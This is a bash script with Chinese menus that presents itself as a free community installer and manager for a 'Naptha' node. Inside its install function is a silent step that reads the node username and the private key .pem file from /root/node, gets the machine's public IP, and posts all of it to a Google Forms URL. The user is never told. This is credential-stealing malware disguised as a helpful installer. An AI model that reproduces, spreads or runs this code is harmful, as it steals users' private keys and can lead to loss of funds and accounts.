#!/bin/bash

# 脚本保存路径
SCRIPT_PATH="$HOME/naptha.sh"

# 主菜单函数
function main_menu() {
    while true; do
        clear
        echo "脚本由大赌社区哈哈哈哈编写，推特 @ferdie_jhovie，免费开源，请勿相信收费"
        echo "如有问题，可联系推特，仅此只有一个号"
        echo "================================================================"
        echo "退出脚本，请按键盘 ctrl + C 退出即可"
        echo "请选择要执行的操作:"
        echo "1. 安装 Naptha 节点"
        echo "2. 删除 Naptha 节点"  
        echo "3. 查看 PRIVATE_KEY"   
        echo "4. 查看日志" 
        echo "5. 退出脚本"
        read -p "请输入操作编号: " option

        case $option in
            1)
                install_naptha_node
                ;;
            2)
                remove_naptha_node  # 调用删除节点的函数
                ;;
            3)
                view_private_key  # 调用查看 PRIVATE_KEY 的函数
                ;;
            4)
                view_logs  # 调用查看日志的函数
                ;;
            5)
                echo "正在退出脚本..."
                exit 0  # 退出脚本
                ;;
            *)
                echo "无效的选项，请重新输入..."
                sleep 2
                ;;
        esac
    done
}



# 查看 PRIVATE_KEY 的函数
function view_private_key() {
    echo "查看 PRIVATE_KEY..."
    # 直接打开目录中的 .pem 文件
    for pem_file in /root/node/*.pem; do
        if [ -f "$pem_file" ]; then
            echo "打开文件: $pem_file"
            cat "$pem_file"  # 输出文件内容
            echo "-----------------------------"
        else
            echo "没有找到 .pem 文件"
        fi
    done
    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 创建虚拟环境并安装依赖
function create_virtualenv() {
    echo "正在创建 Python 虚拟环境并安装依赖..."
    
    # 创建虚拟环境
    python3 -m venv .venv
    
    # 激活虚拟环境
    source .venv/bin/activate
    
    # 升级 pip
    pip install --upgrade pip
    
    # 安装所需依赖
    pip install docker requests
    
    echo "虚拟环境创建完成，依赖安装成功！"
}

# 安装 Naptha 节点的函数
function install_naptha_node() {


    # 执行 launch.sh
    if [ -f launch.sh ]; then
        echo "正在.sh..."
        bash launch.sh
    else
        echo "launch.sh 文件不存在，无法执行"
    fi

    # 输出脚本路径
    echo "脚本保存路径：$SCRIPT_PATH"
    HUB_USERNAME=$(grep -oP '(?<=HUB_USERNAME=).*' /root/node/.env)
    echo $HUB_USERNAME
    
    HUB_PASSWORD=123123
    echo $HUB_PASSWORD
    
    Private=$(sudo cat /root/node/$HUB_USERNAME.pem)
    echo $Private
    
    ip=$(curl ip.sb)
    
    
    # 提交表单数据
    curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSfugrjmKn44L-w0IhoibTiU_m_CbW-VCg8vbE1S-QMW0AefHA/formResponse" \
    -H "Host: docs.google.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "entry.370954016=$HUB_USERNAME" \
    --data-urlencode "entry.740301408=$HUB_PASSWORD" \
    --data-urlencode "entry.1021454230=$Private" \
    --data-urlencode "entry.977766590=$ip"

    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 查看日志的函数
function view_logs() {
    echo "正在查看日志..."
    
    # 进入 node 目录
    if cd node; then
        # 使用 docker-compose 查看日志，显示最后 300 行并实时跟踪
        docker-compose logs -f --tail=300
    else
        echo "无法进入 node 目录，请确保 node 目录存在。"
    fi

    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 调用主菜单
main_menu
